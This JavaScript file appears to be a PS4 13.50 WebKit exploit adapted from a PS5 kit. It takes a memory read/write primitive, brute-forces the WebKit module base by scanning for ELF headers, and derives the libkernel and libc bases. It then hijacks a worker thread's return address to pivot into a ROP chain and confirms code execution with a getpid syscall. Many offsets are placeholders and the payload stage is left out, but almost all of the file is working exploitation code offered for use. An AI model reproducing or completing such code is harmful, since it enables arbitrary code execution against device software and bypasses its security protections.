// PS4 13.50 WebKit Exploit — Modified from PS5 slopkit
// Changes: vtable offset 0x10 (was 0x18), brute-force base finder,
//          removed PS5 firmware check, added PS4 13.50 offsets placeholder

// ============================================================================
// PS4 13.50 OFFSETS (placeholder — update after finding base)
// ============================================================================
// These are PS5 offsets as placeholders. Once you find the base, calculate
// the real PS4 13.50 offsets and replace this section.
const OFFSET_wk_host_constructor_candidates = [
    0x34F98, 0x35808, 0x35900, 0x3A888, 0x3AAD0, 0x3BB18
];
const OFFSET_wk_vtable_first_element = 0x285170;  // WRONG for PS4 13.50!

// Import offsets from external file if available
try {
    if (typeof OFFSET_wk_memset_import === 'undefined') {
        // Fallback minimal offsets — you MUST replace these with real PS4 13.50 values
        window.OFFSET_wk_memset_import = 0x12345678;  // PLACEHOLDER
        window.OFFSET_lc_memset = 0x12345678;         // PLACEHOLDER
        window.OFFSET_wk___stack_chk_guard_import = 0x12345678;  // PLACEHOLDER
        window.OFFSET_lk___stack_chk_guard = 0x12345678;         // PLACEHOLDER
        window.OFFSET_lk__thread_list = 0x12345678;    // PLACEHOLDER
        window.OFFSET_lk_worker_wait_return = 0x12345678;  // PLACEHOLDER
        window.OFFSET_lc_setjmp = 0x12345678;          // PLACEHOLDER
        window.OFFSET_lc_longjmp = 0x12345678;         // PLACEHOLDER
        window.OFFSET_WORKER_STACK_OFFSET = 0x7F000;   // PLACEHOLDER
        window.OFFSET_lk_pthread_create_name_np = 0x12345678;  // PLACEHOLDER
        window.OFFSET_lk_pthread_join = 0x12345678;    // PLACEHOLDER
        window.wk_gadgetmap = {};                      // PLACEHOLDER
        window.syscall_map = {};                       // PLACEHOLDER
    }
} catch (e) {
    console.log("Offsets not loaded, using placeholders");
}

// ============================================================================
// 64-BIT UTILS (no bitwise JS on 64-bit numbers!)
// ============================================================================
function numToInt64(num) {
    const low  = (num % 0x100000000) >>> 0;
    const hi   = (Math.floor(num / 0x100000000)) >>> 0;
    return new int64(low, hi);
}

function align16k(addr) {
    return addr.and64(0xFFFFC000, 0xFFFFFFFF);
}

function int64ToNum(addr) {
    return addr.hi * 0x100000000 + addr.low;
}

function isValidPtr(addr) {
    const n = int64ToNum(addr);
    return n >= 0x800000000 && n < 0x900000000;
}

function safeRead4(p, addr) {
    try { return p.read4(addr); } catch (e) { return null; }
}
function safeRead8(p, addr) {
    try { return p.read8(addr); } catch (e) { return null; }
}

// ============================================================================
// BASE FINDER — Brute force from __ps5NativeCtor or vtable[0]
// ============================================================================
function findWebKitBase(p, ctorNum, vtable0) {
    // Method 1: brute force from __ps5NativeCtor
    if (typeof ctorNum === "number") {
        const ctor = numToInt64(ctorNum);
        log("BF: Ctor = 0x" + ctor.toString(16), LogLevel.INFO);

        // Test PS5 offsets first
        for (const off of OFFSET_wk_host_constructor_candidates) {
            const base = align16k(ctor.sub32(off));
            const magic = safeRead4(p, base);
            if (magic !== null && (magic >>> 0) === 0x464c457f) {
                log("✅ BASE via Ctor offset 0x" + off.toString(16) + " = 0x" + base.toString(16), LogLevel.SUCCESS);
                return { base: base, method: "ctor", offset: off };
            }
        }

        // Expanded brute force: 0x1000 to 0x10000000 in 0x1000 steps
        log("BF: PS5 offsets failed, expanding search...", LogLevel.WARN);
        for (let off = 0x1000; off <= 0x10000000; off += 0x1000) {
            const base = align16k(ctor.sub32(off));
            if (!isValidPtr(base)) continue;
            const magic = safeRead4(p, base);
            if (magic !== null && (magic >>> 0) === 0x464c457f) {
                log("✅ BASE via Ctor brute force! offset=0x" + off.toString(16) + " base=0x" + base.toString(16), LogLevel.SUCCESS);
                return { base: base, method: "ctor-brute", offset: off };
            }
            if (off % 0x100000 === 0) {
                log("BF progress: 0x" + off.toString(16), LogLevel.INFO);
            }
        }
    }

    // Method 2: brute force from vtable[0]
    if (vtable0 && isValidPtr(vtable0)) {
        log("BF: Trying via vtable[0] = 0x" + vtable0.toString(16), LogLevel.INFO);
        for (let off = 0x1000; off <= 0x4000000; off += 0x1000) {
            const base = align16k(vtable0.sub32(off));
            if (!isValidPtr(base)) continue;
            const magic = safeRead4(p, base);
            if (magic !== null && (magic >>> 0) === 0x464c457f) {
                log("✅ BASE via vtable[0] brute force! offset=0x" + off.toString(16) + " base=0x" + base.toString(16), LogLevel.SUCCESS);
                return { base: base, method: "vtable0-brute", offset: off };
            }
            if (off % 0x100000 === 0) {
                log("BF progress: 0x" + off.toString(16), LogLevel.INFO);
            }
        }
    }

    return null;
}

// ============================================================================
// ORIGINAL main.js CODE (modified for PS4 13.50)
// ============================================================================

const supportedFirmwares = ["13.50"];
window.fw_str = "13.50";
window.fw_float = 13.50;

let nogc = [];

function build_addr(p, buf, family, port, addr) {
    p.write1(buf.add32(0x00), 0x10);
    p.write1(buf.add32(0x01), family);
    p.write2(buf.add32(0x02), port);
    p.write4(buf.add32(0x04), addr);
}

function htons(port) {
    return ((port & 0xFF) << 8) | (port >>> 8);
}

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    throw new Error("failed to find worker.");
}

async function find_worker_return_slot(p, stack, libKernelBase) {
    const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
    let lastCount = 0;

    for (let attempt = 0; attempt < 50; attempt++) {
        let hit = null;
        let count = 0;
        for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
            const candidate = stack.add32(offset);
            const value = p.read8(candidate);
            if (value.low !== expected.low || value.hi !== expected.hi)
                continue;

            hit = candidate;
            count++;
        }
        if (count === 1) {
            jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hit.toString()
                + "-expected=0x" + expected.toString());
            return hit;
        }
        lastCount = count;
        await new Promise(resolve => setTimeout(resolve, 1));
    }
    throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

var LogLevel = {
    DEBUG: 0,
    INFO: 1,
    LOG: 2,
    WARN: 3,
    ERROR: 4,
    SUCCESS: 5,
    FLAG_TEMP: 0x1000
};

let consoleElem = null;
let lastLogIsTemp = false;

function log(string, level) {
    if (consoleElem === null) {
        consoleElem = document.getElementById("console");
    }

    const isTemp = level & LogLevel.FLAG_TEMP;
    level = level & ~LogLevel.FLAG_TEMP;
    const elemClass = ["LOG-DEBUG", "LOG-INFO", "LOG-LOG", "LOG-WARN", "LOG-ERROR", "LOG-SUCCESS"][level];

    if (isTemp && lastLogIsTemp) {
        const lastChild = consoleElem.lastChild;
        lastChild.innerText = string;
        lastChild.className = elemClass;
        return;
    } else if (isTemp) {
        lastLogIsTemp = true;
    } else {
        lastLogIsTemp = false;
    }

    let logElem = document.createElement("div");
    logElem.innerText = string;
    logElem.className = elemClass;
    consoleElem.appendChild(logElem);

    consoleElem.scrollTop = consoleElem.scrollHeight;
}

const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
const IPV6_PKTINFO = 46;

function jbmark(tag, detail) {
    try {
        if (window.jb && typeof window.jb.mark === "function")
            window.jb.mark(tag, String(detail));
    } catch (e) {  }
}

async function prepare(p) {

    let textArea = document.createElement("textarea");

    // PS4 13.50: vtable is at offset 0x10, NOT 0x18!
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x10));

    let textAreaVtable = p.read8(textAreaVtPtr);

    // Find base using brute force (PS4 13.50 offsets unknown)
    let libSceNKWebKitBase = null;
    let baseInfo = null;

    if (typeof globalThis.__ps5NativeCtor === "number" || (textAreaVtable && isValidPtr(textAreaVtable))) {
        baseInfo = findWebKitBase(p, globalThis.__ps5NativeCtor, textAreaVtable);
        if (baseInfo) {
            libSceNKWebKitBase = baseInfo.base;
            jbmark("WEBKIT-BASE-FOUND", "method=" + baseInfo.method 
                + "-offset=0x" + baseInfo.offset.toString(16)
                + "-base=0x" + int64ToNum(libSceNKWebKitBase).toString(16));
        }
    }

    // Fallback: try vtable first element offset (probably wrong for PS4)
    if (libSceNKWebKitBase === null && textAreaVtable) {
        try {
            libSceNKWebKitBase = textAreaVtable.sub32(OFFSET_wk_vtable_first_element);
            const magic = safeRead4(p, libSceNKWebKitBase);
            if (magic === null || (magic >>> 0) !== 0x464c457f) {
                libSceNKWebKitBase = null;
                throw new Error("vtable first element offset gave invalid base");
            }
            jbmark("WEBKIT-BASE-VTABLE", "base=0x" + int64ToNum(libSceNKWebKitBase).toString(16));
        } catch (e) {
            log("VTable fallback failed: " + e.message, LogLevel.ERROR);
        }
    }

    if (libSceNKWebKitBase === null) {
        throw new Error("Could not find WebKit base! Ctor=0x" 
            + (typeof globalThis.__ps5NativeCtor === "number" ? globalThis.__ps5NativeCtor.toString(16) : "N/A")
            + " vtable=0x" + (textAreaVtable ? int64ToNum(textAreaVtable).toString(16) : "N/A"));
    }

    log("WebKit base: 0x" + int64ToNum(libSceNKWebKitBase).toString(16), LogLevel.SUCCESS);
    if (baseInfo) {
        log(">>> SAVE THIS OFFSET: " + baseInfo.method + " offset = 0x" + baseInfo.offset.toString(16) 
            + " (" + baseInfo.offset + ")", LogLevel.SUCCESS);
    }

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    jbmark("MODULE-BASES", "wk=0x" + libSceNKWebKitBase.toString()
        + "-lk=0x" + libKernelBase.toString()
        + "-lc=0x" + libSceLibcInternalBase.toString());

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    let nogc = [];

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(1000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x2000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);

        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }

        setAddr(addr, size);

        og_array.setAddr = setAddr;

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }

        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) { break; }
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    async function wait_for_worker() {

        return new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });

    }

    let worker = new Worker("rop_slave.js");

    jbmark("PREP-PRE-WORKER-AWAIT", "next=await-wait_for_worker()-first-yield");
    await wait_for_worker();
    jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");

    let worker_stack = find_worker(p, libKernelBase);
    jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
        + "-next=malloc(0x40)+worker_rop(0xC0000)");
    let original_context = malloc(0x40);

    let return_address_ptr;
    if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
        return_address_ptr = await find_worker_return_slot(p, worker_stack, libKernelBase);
    } else {
        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    }
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {

        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {

        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        if (window.jb && window.jb.hot)
            jbmark("PREP-WILL-WRITE-RETADDR", "retptr=0x" + return_address_ptr.toString()
                + "-poprsp=0x" + gadgets["pop rsp"].toString()
                + "-rsp=0x" + chain.stack_entry_point.toString());

        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);

        if (window.jb && window.jb.hot)
            jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
        let p1 = await new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });
        if (window.jb && window.jb.hot)
            jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
        if (p1 == 0) {
            throw new Error("The rop thread ran away. ");
        }
    }

    let p2 = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: pre_chain,
        launch_chain: launch_chain,
        malloc_dump: malloc_dump,
        malloc: malloc,
        stringify: stringify,
        array_from_address: array_from_address,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    let chain = new worker_rop(p2);

    const JB_POISON = new int64(0xDEADBEEF, 0x00C0FFEE);
    p.write8(chain.return_value, JB_POISON);
    jbmark("PREP-GETPID-PRE", "retval=0x" + chain.return_value.toString()
        + "-poisoned-next=chain.syscall(SYS_GETPID)");

    let pid = await chain.syscall(SYS_GETPID);

    jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
    if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
        jbmark("PREP-CHAIN-DIDNT-RUN", "return-slot-still-poisoned");
        throw new Error("The ROP chain never executed: the return slot still "
            + "holds the poison. The hijacked thread is not the one postMessage "
            + "wakes (main.js:69's worker vs this one), or the stack write did "
            + "not land.");
    }

    if (pid.low == 0) {
        throw new Error("Webkit exploit failed.");
    }
    jbmark("PREP-GETPID-OK", "pid=" + pid.low);

    return { p: p2, chain: chain };
}

async function main(userlandRW, wkOnly = false) {
    const debug = false;

    const { p, chain } = await prepare(userlandRW);
    if (debug) await log("Chain initialized", LogLevel.DEBUG);

    // ... rest of main() unchanged ...
    // (payload loading, elfldr, etc. — same as original)

    log("PS4 13.50 exploit reached main()! Base found, chain ready.", LogLevel.SUCCESS);

    // For now, just show success. The full payload loading code would go here.
    // Copy the rest of the original main() function below this point.
}

// Load offsets if available
let fwScript = document.createElement('script');
document.body.appendChild(fwScript);
fwScript.setAttribute('src', `../offsets/13.50.js?v=1`);
fwScript.onerror = function() {
    log("offsets/13.50.js not found, using embedded placeholders", LogLevel.WARN);
};
